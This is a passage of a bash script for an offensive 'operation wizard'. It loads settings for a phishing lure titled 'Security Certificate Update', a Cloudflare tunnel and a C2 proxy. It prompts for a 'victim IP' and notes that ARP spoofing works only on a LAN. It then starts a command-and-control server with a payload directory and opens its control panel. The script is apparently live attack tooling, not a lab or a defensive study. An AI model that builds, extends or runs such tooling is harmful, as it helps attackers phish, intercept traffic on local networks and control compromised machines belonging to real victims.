# ── Load / save wizza config ──────────────────────────────────
load_wizza_cfg() {
    CUSTOM_DOMAIN=""; LURE_PATH="/docs"; LURE_TITLE="Security Certificate Update"
    CF_TUNNEL_NAME=""; CF_DOMAIN=""; C2_PROXY_BAKE=""
    [ -f "$WIZZA_CFG" ] || return
    while IFS='=' read -r k v; do
        case "$k" in
            CUSTOM_DOMAIN)   CUSTOM_DOMAIN="$v" ;;
            LURE_PATH)       LURE_PATH="$v" ;;
            LURE_TITLE)      LURE_TITLE="$v" ;;
            CF_TUNNEL_NAME)  CF_TUNNEL_NAME="$v" ;;
            CF_DOMAIN)       CF_DOMAIN="$v" ;;
            C2_PROXY)        C2_PROXY_BAKE="$v" ;;
        esac
    done < "$WIZZA_CFG"
    # CF_DOMAIN is the active custom domain (named tunnel)
    # CUSTOM_DOMAIN kept for backward compat
    [ -n "$CF_DOMAIN" ] && CUSTOM_DOMAIN="$CF_DOMAIN"
}
save_wizza_cfg() {
    printf 'CUSTOM_DOMAIN=%s\nLURE_PATH=%s\nLURE_TITLE=%s\nCF_TUNNEL_NAME=%s\nCF_DOMAIN=%s\nC2_PROXY=%s\n' \
        "$CUSTOM_DOMAIN" "$LURE_PATH" "$LURE_TITLE" "$CF_TUNNEL_NAME" "$CF_DOMAIN" "$C2_PROXY_BAKE" > "$WIZZA_CFG"
}
load_wizza_cfg

# ── Colours ──────────────────────────────────────────────────
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'
C='\033[0;36m'; W='\033[1;37m'; N='\033[0m'
B='\033[0;34m'

# ── Helpers ──────────────────────────────────────────────────
banner() {
    clear
    echo -e "${C}"
    echo "  ╔═══════════════════════════════════════════════════╗"
    echo "  ║              OPERATION WIZARD                     ║"
    echo "  ╚═══════════════════════════════════════════════════╝"
    echo -e "${N}"
}

step() {
    echo -e "\n${Y}┌─ STEP $1: $2${N}"
}

ok()   { echo -e "  ${G}✓${N} $1"; }
warn() { echo -e "  ${Y}!${N} $1"; }
err()  { echo -e "  ${R}✗${N} $1"; }
info() { echo -e "  ${C}→${N} $1"; }

ask() {
    echo -e "\n  ${W}$1${N}"
    echo -n "  > "
    read -r REPLY
}

# Validate IPv4 — returns 0 if valid, 1 if not
valid_ip() {
    local ip="$1"
    [[ "$ip" =~ ^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$ ]] || return 1
    local o
    for o in "${BASH_REMATCH[@]:1}"; do (( o <= 255 )) || return 1; done
    return 0
}

# Prompt for victim IP with validation loop; sets VICTIM_IP
ask_victim_ip() {
    local _prompt="${1:-Victim IP}"
    local _allow_blank="${2:-}"   # pass "optional" to allow empty answer
    while true; do
        ask "$_prompt"
        if [ -z "$REPLY" ]; then
            [ "$_allow_blank" = "optional" ] && return 0
            err "IP address required — cannot be blank."
            continue
        fi
        if valid_ip "$REPLY"; then
            local _candidate="$REPLY"
            # Warn if looks like a public/WAN IP (not RFC-1918)
            local _f1; _f1=$(echo "$_candidate" | cut -d. -f1)
            local _f2; _f2=$(echo "$_candidate" | cut -d. -f2)
            if ! { [ "$_f1" = "10" ] || [ "$_f1" = "172" -a "$_f2" -ge 16 -a "$_f2" -le 31 ] || [ "$_f1" = "192" -a "$_f2" = "168" ]; }; then
                warn "'$_candidate' looks like a public IP — ARP spoof only works on LAN (192.168.x.x / 10.x.x.x)"
                ask "Use it anyway? [y/N]:"
                [[ "${REPLY,,}" == "y" ]] || continue
            fi
            VICTIM_IP="$_candidate"
            return 0
        else
            err "Invalid IP: '$REPLY'  (must be 0-255 in each octet, e.g. 192.168.1.42)"
        fi
    done
}

choose() {
    echo -e "\n  ${W}$1${N}"
    local i=1
    for opt in "${@:2}"; do
        echo -e "  ${C}[$i]${N} $opt"
        ((i++))
    done
    echo -n "  > "
    read -r CHOICE
}

wait_key() {
    echo -e "\n  ${B}Press Enter to continue...${N}"
    read -r
}

log() { echo "[$(date '+%H:%M:%S')] $1" >> "$LOG"; }

# ══════════════════════════════════════════════════════════════
# INIT — write every embedded file to $OP/ on first run
# This makes /tmp/start fully self-contained — no other files
# ══════════════════════════════════════════════════════════════
# ── Auto-start C2 if not already running ─────────────────────
# Reads actual port from $OP/logs/c2_ports.txt (written by c2_server.py)
# C2 auto-selects a free port in range 8888–8938 if preferred is busy
ensure_c2() {
    local _ports_file="$OP/logs/c2_ports.txt"
    local _port="${C2_PORT:-8888}"

    # Read actual port if c2 was previously started with a different port
    if [ -f "$_ports_file" ]; then
        _port=$(grep "^C2_PORT=" "$_ports_file" 2>/dev/null | cut -d= -f2 | tr -d '[:space:]')
        [ -z "$_port" ] && _port="${C2_PORT:-8888}"
    fi

    # Check if already running on any port in range 8888-8938
    local _running_port
    _running_port=$(ss -tlnp 2>/dev/null | grep -oE ':(88[0-9]{2}|89[0-3][0-9]) ' | tr -d ': ' | head -1)

    if [ -n "$_running_port" ]; then
        C2_ACTIVE_PORT="$_running_port"
        echo ""
        echo -e "  ${G}╔══════════════════════════════════════════════╗${N}"
        echo -e "  ${G}║  C2 PANEL:  http://localhost:$C2_ACTIVE_PORT/panel  ║${N}"
        echo -e "  ${G}╚══════════════════════════════════════════════╝${N}"
        echo ""
        xdg-open "http://localhost:$C2_ACTIVE_PORT/panel" 2>/dev/null &
        return
    fi

    info "Starting C2 server (will auto-select free port from 8888)..."
    mkdir -p "$OP/logs"
    LOG_DIR="$OP/logs" PAYLOAD_DIR="$OP/payloads" \
        C2_TLS=0 nohup python3 "$C2_DIR/c2_server.py" > "$OP/logs/c2_auto.log" 2>&1 &
    C2_PID=$!

    # Wait up to 8s for it to bind and write ports file
    local _i
    for _i in $(seq 1 8); do
        sleep 1
        if [ -f "$_ports_file" ]; then
            _port=$(grep "^C2_PORT=" "$_ports_file" | cut -d= -f2 | tr -d '[:space:]')
            [ -n "$_port" ] && break
        fi
    done

    C2_ACTIVE_PORT="${_port:-8888}"
    if ss -tlnp 2>/dev/null | grep -q ":$C2_ACTIVE_PORT "; then
        echo ""
        echo -e "  ${G}╔══════════════════════════════════════════════╗${N}"
        echo -e "  ${G}║  C2 PANEL:  http://localhost:$C2_ACTIVE_PORT/panel  ║${N}"
        echo -e "  ${G}╚══════════════════════════════════════════════╝${N}"
        echo ""
        # Try to open browser — works if DISPLAY is set
        xdg-open "http://localhost:$C2_ACTIVE_PORT/panel" 2>/dev/null &
    else
        warn "C2 failed to start — check $OP/logs/c2_auto.log"
        tail -3 "$OP/logs/c2_auto.log" 2>/dev/null
    fi
}

